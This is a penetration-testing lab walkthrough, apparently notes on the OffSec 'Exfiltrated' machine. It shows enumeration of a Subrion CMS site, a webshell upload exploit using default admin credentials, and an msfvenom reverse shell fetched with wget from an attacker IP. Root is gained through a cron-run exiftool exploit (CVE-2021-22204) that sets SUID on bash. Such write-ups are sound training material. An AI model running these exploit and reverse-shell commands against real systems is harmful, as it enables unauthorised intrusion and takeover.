## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.124.163

# HOSTNAME                      // Found post initial foothold
exfiltrated
# OPERATING SYSTEM              // Found post initial foothold
bash-5.0# cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS"
NAME="Ubuntu"
VERSION="20.04.2 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.2 LTS"
VERSION_ID="20.04"

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
```
# ENUMERATION
## PORT 80
```bash
# Nmap
- 80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- http-title: Did not follow redirect to http://exfiltrated.offsec/
- http server: Apache/2.4.41 (Ubuntu)
- http-robots.txt: 7 disallowed entries 
- /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/
- http-methods: GET HEAD POST OPTIONS

- Adding host
- Add exfiltrated.offsec to hosts file /etc/hosts
export url=http://exfiltrated.offsec

# Enumeration 
sudo whatweb $url | sed 's/,/\n/g'
http://exfiltrated.offsec [200 OK] Apache[2.4.41]
 Bootstrap
 Cookies[INTELLI_06c8042c3d]
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
 IP[192.168.124.163]
 JQuery
 MetaGenerator[Subrion CMS - Open Source Content Management System]
 Open-Graph-Protocol
 PoweredBy[Subrion]
 Script
 Title[Home :: Powered by Subrion 4.2]
 UncommonHeaders[x-powered-cms]
 X-UA-Compatible[IE=Edge]

- Found 
	- Subrion CMS - Open Source Content Management System
	- Powered by Subrion 4.2


- Links from source code http://exfiltrated.offsec/

//exfiltrated.offsec/favicon.ico
//exfiltrated.offsec/templates/kickstart/css/iabootstrap.css?fm=1528952694
//exfiltrated.offsec/templates/kickstart/css/user-style.css?fm=1528952694
//exfiltrated.offsec/modules/fancybox/js/jquery.fancybox.css?fm=1528952694
http://exfiltrated.offsec/login/
http://exfiltrated.offsec/registration/
http://exfiltrated.offsec/members/
http://exfiltrated.offsec/blog/
http://exfiltrated.offsec/panel/
http://exfiltrated.offsec/about/
http://exfiltrated.offsec/policy/
http://exfiltrated.offsec/terms/
http://exfiltrated.offsec/help/
http://exfiltrated.offsec/blog/

- From url http://exfiltrated.offsec/panel/
	- Found specifice version Subrion 4.2.1
- Uses default creds admin:admin

# Exploit 
Subrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.py

```
## PORT 22
```bash
22/tcp open ssh syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
```

## INITIAL FOOTHOLD
```bash
# www-data shell
python3 49876.py -u $url/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: 1K312afR3NLMuIZi6dAxCVszH0WGfhpW6Vk60nCt
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: qbvspenlqgcobrv

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qbvspenlqgcobrv.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Shell upgrade
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f elf -o shellx.elf

sudo python3 -m http.server 80
wget 192.168.45.221/shellx.elf -O /tmp/shell
chmod 777 /tmp/shell

sudo nc -nvlp 4444
/tmp/shell
```
## PRIVILEGE ESCALATION
```bash
cat /etc/crontab
* *     * * *   root    bash /opt/image-exif.sh

cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 
echo -ne "\\n metadata directory cleaned! \\n\\n"
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"
echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done
echo -ne "\\n\\n Processing is finished! \\n\\n\\n"

- The script runs exiftool
- Enumerating exiftool
	- exiftool -ver 
	- 11.88

# Found exiftool exploit
https://github.com/UNICORDev/exploit-CVE-2021-22204
sudo cp /usr/share/backgrounds/kali-16x9/kali-aqua.jpg ./image4.jpg
sudo python3 exploit-CVE-2021-22204.py -c "chmod +s /usr/bin/bash" -i image4.jpg

UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${system('chmod +s /usr/bin/bash')};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"

sudo python3 -m http.server 80

www-data@exfiltrated:/var/www/html/subrion/uploads$ wget 192.168.45.221/image.jpg
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /usr/bin/bash

www-data@exfiltrated:/var/www/html/subrion/uploads$ bash -p
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-5.0# whoami
root

# root
```
# NOTE
```bash
# Work on learning better ways to  upgrade shell 
- Basic webshell from the exploit 49876.py was hard to upgrade
- Revereshell methods didn't work as expected
# Shell upgrade
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f elf -o shellx.elf

sudo python3 -m http.server 80
wget 192.168.45.221/shellx.elf -O /tmp/shell
chmod 777 /tmp/shell

sudo nc -nvlp 4444
/tmp/shell
```

# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Dec  2 10:42:33 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.124.163
Nmap scan report for 192.168.124.163
Host is up, received reset ttl 61 (0.040s latency).
Scanned at 2024-12-02 10:42:35 IST for 22s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML

80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  2 10:42:57 2024 -- 1 IP address (1 host up) scanned in 24.47 seconds

```

